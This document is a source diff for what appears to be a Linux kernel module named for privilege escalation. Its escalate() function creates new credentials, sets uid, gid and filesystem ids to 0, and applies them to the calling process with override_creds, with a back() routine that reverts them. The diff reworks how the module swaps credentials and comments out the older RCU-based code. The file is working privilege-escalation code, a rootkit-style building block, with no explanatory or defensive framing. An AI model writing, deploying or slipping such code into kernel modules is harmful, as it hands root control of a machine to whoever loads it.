@@ -5,7 +5,7 @@
 #include<linux/slab.h>
 #include "privilege_escalation.h"
 
-static struct cred * current_cred;
+const static struct cred * current_cred = NULL;
 static struct cred * new_cred;
 
 void escalate(){
@@ -13,14 +13,15 @@ void escalate(){
     printk(KERN_INFO "You are already root\n");
     return;
   }
-  printk(KERN_INFO "current uid %d\n", current->cred->uid);
-  rcu_read_lock();
-  do {
-     current_cred = __task_cred((current));
-  } while (!atomic_inc_not_zero(&((struct cred *)current_cred)->usage));
-  if(current_cred){
-    printk(KERN_INFO "current uid %d\n", current_cred->suid);
-  }
+  //printk(KERN_INFO "current uid %d\n", current->cred->uid);
+  //rcu_read_lock();
+  //do {
+    // current_cred = current->real_cred;
+  //} while (!atomic_inc_not_zero(&((struct cred *)current_cred)->usage));
+  //if(current_cred){
+  //  printk(KERN_INFO "current uid %d\n", current_cred->suid);
+  //}
+  //rcu_read_unlock();
   new_cred = prepare_creds();
   if (!new_cred){
     printk(KERN_INFO "Prepare new task credential failed!\n");
@@ -35,16 +36,18 @@ void escalate(){
   new_cred->fsuid = 0;
   new_cred->fsgid = 0;
 
-  commit_creds(new_cred);
-  rcu_read_unlock();
+  current_cred = override_creds(new_cred);
   printk(KERN_INFO "new uid %d\n", current->cred->uid);
 } 
 
 void back(void){
- if(current_cred){
-    commit_creds(current_cred);
+ if(new_cred){
+    //abort_creds(new_cred);
+    revert_creds(current_cred);
+    put_cred(new_cred);
+    printk(KERN_INFO "new uid %d\n", current->cred->uid);
     current_cred = NULL;
-    kfree(new_cred);
+   // kfree(new_cred);
     new_cred = NULL;
   }
 }
